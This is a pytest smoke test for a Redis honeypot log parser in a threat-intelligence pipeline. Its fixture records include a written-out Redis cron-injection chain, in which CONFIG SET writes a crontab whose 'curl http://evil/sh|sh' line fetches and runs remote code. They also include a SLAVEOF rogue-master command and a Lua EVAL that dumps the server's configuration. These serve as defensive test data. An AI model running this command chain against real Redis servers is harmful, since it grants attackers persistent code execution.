"""Smoke test for the redishoneypot parser (migrated from its old
`if __name__` block so CI runs it). Generic parse/correlate/
STIX contract is covered in test_parsers.py."""
from __future__ import annotations

import tpot2cti.parsers.redishoneypot as _m
globals().update({k: v for k, v in vars(_m).items() if not k.startswith('__')})


def test_redishoneypot_smoke():
    from datetime import datetime, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = RedishoneypotParser()
    now = datetime.now(timezone.utc)

    # ── Case 1: drive-by — INFO / PING only ───────────────────────────
    driveby_doc = {
        "@timestamp": now.isoformat(),
        "type": "Redishoneypot",
        "src_ip": "203.0.113.30",
        "dst_port": 6379,
        "t-pot_hostname": "node1",
        "commands_received": ["INFO", "PING", "COMMAND"],
        "geoip": {"country_iso_code": "US", "asn": 64500},
    }

    # ── Case 2: substantive — CONFIG SET + SLAVEOF chain ──────────────
    substantive_doc = {
        "@timestamp": now.isoformat(),
        "type": "Redishoneypot",
        "src_ip": "198.51.100.30",
        "dst_port": 6379,
        "t-pot_hostname": "node1",
        "commands_received": [
            "INFO",
            "CONFIG SET dir /var/spool/cron",
            "CONFIG SET dbfilename root",
            "SET x \"\\n* * * * * curl http://evil/sh|sh\\n\"",
            "SAVE",
            "SLAVEOF 1.2.3.4 6379",
        ],
        "geoip": {"country_iso_code": "RU", "asn": 12345},
    }

    # ── Case 3: substantive — EVAL only (Lua) ─────────────────────────
    eval_doc = {
        "@timestamp": now.isoformat(),
        "type": "Redishoneypot",
        "src_ip": "198.51.100.31",
        "dst_port": 6379,
        "t-pot_hostname": "node1",
        "commands_received": ["EVAL \"return redis.call('config', 'get', '*')\" 0"],
    }

    # ── Case 4: empty commands list — must be non-substantive ─────────
    empty_doc = {
        "@timestamp": now.isoformat(),
        "type": "Redishoneypot",
        "src_ip": "198.51.100.32",
        "dst_port": 6379,
        "t-pot_hostname": "node1",
        "commands_received": [],
    }

    de = parser.parse(driveby_doc)
    se = parser.parse(substantive_doc)
    ee = parser.parse(eval_doc)
    empty_e = parser.parse(empty_doc)
    assert de and se and ee and empty_e, "parse failed"

    ds = parser.correlate([de])[0]
    ss = parser.correlate([se])[0]
    es = parser.correlate([ee])[0]
    empty_s = parser.correlate([empty_e])[0]

    # Commands mirrored onto the session
    assert ss.commands and "CONFIG SET dir /var/spool/cron" in ss.commands

    print("OK")
